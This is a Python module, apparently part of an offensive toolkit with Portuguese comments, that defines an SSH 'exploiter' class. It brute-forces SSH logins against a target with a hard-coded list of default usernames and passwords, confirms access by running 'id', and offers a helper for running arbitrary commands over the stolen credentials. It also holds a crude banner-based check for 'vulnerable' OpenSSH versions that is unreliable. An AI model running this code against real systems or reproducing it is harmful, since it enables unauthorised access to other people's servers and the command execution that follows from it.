# modules/network/ssh.py
import paramiko
import socket
import threading
from concurrent.futures import ThreadPoolExecutor
import subprocess

class SSHExploiter:
    def __init__(self):
        self.common_users = ['root', 'admin', 'ubuntu', 'centos', 'debian', 'test', 'user']
        self.common_passwords = [
            '', '123456', 'password', 'admin', '12345', 'root', 'toor',
            'ubuntu', 'centos', 'debian', 'password123', 'Welcome1'
        ]
        self.common_keys = ['id_rsa', 'id_dsa', 'authorized_keys']

    def ssh_connect(self, target, port=22, username=None, password=None, key_file=None, timeout=5):
        """Tenta conexão SSH"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if key_file:
                # Tenta conexão com chave
                key = paramiko.RSAKey.from_private_key_file(key_file)
                ssh.connect(target, port, username, pkey=key, timeout=timeout)
            else:
                # Tenta conexão com senha
                ssh.connect(target, port, username, password, timeout=timeout)
            
            return ssh
        except:
            return None

    def ssh_banner_grabbing(self, target, port=22):
        """Banner grabbing SSH"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            
            banner = s.recv(1024).decode('utf-8', errors='ignore')
            s.close()
            
            return banner.strip()
        except:
            return "Unknown"

    def brute_force_ssh(self, target, port=22):
        """Força bruta SSH"""
        valid_creds = []
        
        for user in self.common_users:
            for password in self.common_passwords:
                ssh = self.ssh_connect(target, port, user, password)
                if ssh:
                    valid_creds.append((user, password))
                    print(f"[+] SSH Credencial: {user}:{password}")
                    
                    # Executa comando simples
                    try:
                        stdin, stdout, stderr = ssh.exec_command('id')
                        output = stdout.read().decode()
                        print(f"    [+] Comando 'id': {output.strip()}")
                    except:
                        pass
                    
                    ssh.close()
        
        return valid_creds

    def check_ssh_version(self, target, port=22):
        """Verifica versão do SSH"""
        banner = self.ssh_banner_grabbing(target, port)
        
        # Detecta versões vulneráveis
        vulnerable_versions = [
            'OpenSSH 7.2',  # Vulnerabilities
            'OpenSSH 7.4',  # More vulnerabilities
            'dropbear',     # Sometimes vulnerable
        ]
        
        for vuln_version in vulnerable_versions:
            if vuln_version in banner:
                return banner, True
        
        return banner, False

    def execute_command(self, target, username, password, command):
        """Executa comando via SSH"""
        try:
            ssh = self.ssh_connect(target, 22, username, password)
            if not ssh:
                return None
            
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode() + stderr.read().decode()
            ssh.close()
            
            return output.strip()
            
        except:
            return None

    def ssh_key_brute_force(self, target, port=22):
        """Tenta brute force com chaves comuns"""
        # Isso é apenas conceitual - na prática precisa das chaves
        print("[+] Tentando brute force com chaves SSH comuns...")
        return []

    def scan_ssh(self, target, port=22):
        """Scan completo SSH"""
        print(f"[+] Scan SSH em: {target}:{port}")
        
        results = {
            'banner': None,
            'credentials': [],
            'vulnerable': False,
            'version': None
        }
        
        # Banner grabbing
        results['banner'] = self.ssh_banner_grabbing(target, port)
        print(f"    [+] Banner: {results['banner']}")
        
        # Verifica versão vulnerável
        banner, is_vuln = self.check_ssh_version(target, port)
        results['vulnerable'] = is_vuln
        if is_vuln:
            print(f"    [!] VERSÃO VULNERÁVEL: {banner}")
        
        # Força bruta
        results['credentials'] = self.brute_force_ssh(target, port)
        
        return results